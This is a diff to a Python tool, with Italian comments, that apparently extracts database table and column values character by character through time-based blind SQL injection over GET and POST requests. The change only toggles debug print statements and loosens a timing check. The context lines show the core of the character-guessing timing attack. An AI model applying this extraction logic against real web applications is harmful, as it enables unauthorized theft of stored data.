@@ -144,7 +144,7 @@ def ricostruisciParolaPOST(i,nomeTabella,nomeColonna,indice,condizioneWhere):
                 end = time.time()
                 # se succede questo allora lo abbiamo trovato
                 #time of execution for control
-                print ((end-start),chr(mid),req.elapsed.total_seconds())
+               # print ((end-start),chr(mid),req.elapsed.total_seconds())
                 if ((end - start) >= OptionConfiguration.timeToWait ):
 
                     start = time.time()
@@ -155,7 +155,7 @@ def ricostruisciParolaPOST(i,nomeTabella,nomeColonna,indice,condizioneWhere):
                     if ((end - start) >=OptionConfiguration.timeToWait ):
                         trovato = True
                         value = value + chr(mid)
-                        #print (("posizione %s "+str(chr(mid)))%(i))
+                        print (("posizione %s "+str(chr(mid)))%(i))
                         break
 
                         # carattere trovato
@@ -268,11 +268,11 @@ def ricostruisciParolaGET(i, nomeTabella, nomeColonna, indice,condizioneWhere):
                     end = time.time()
 
                     # se succede questo allora lo abbiamo trovato
-                    if ((end - start) >= OptionConfiguration.timeToWait and (end-start)<=OptionConfiguration.timeToWait*2):
+                    if ((end - start) >= OptionConfiguration.timeToWait ):
                         # carattere trovato
                         trovato = True
                         value = value + chr(mid)
-                        #print ("posizione %s "+str(chr(mid)))%(i)
+                        print ("posizione %s "+str(chr(mid)))%(i)
                         break
                 else:
                     dataToSent = OptionConfiguration.data.copy()
@@ -366,7 +366,7 @@ def ricostruisciParolaGET(i, nomeTabella, nomeColonna, indice,condizioneWhere):
                         # carattere trovato
                         trovato = True
                         value = value + chr(mid)
-                        #print (("Position %s "+str(chr(mid)))%(i))
+                        print (("Position %s "+str(chr(mid)))%(i))
                         break
 
                 else:
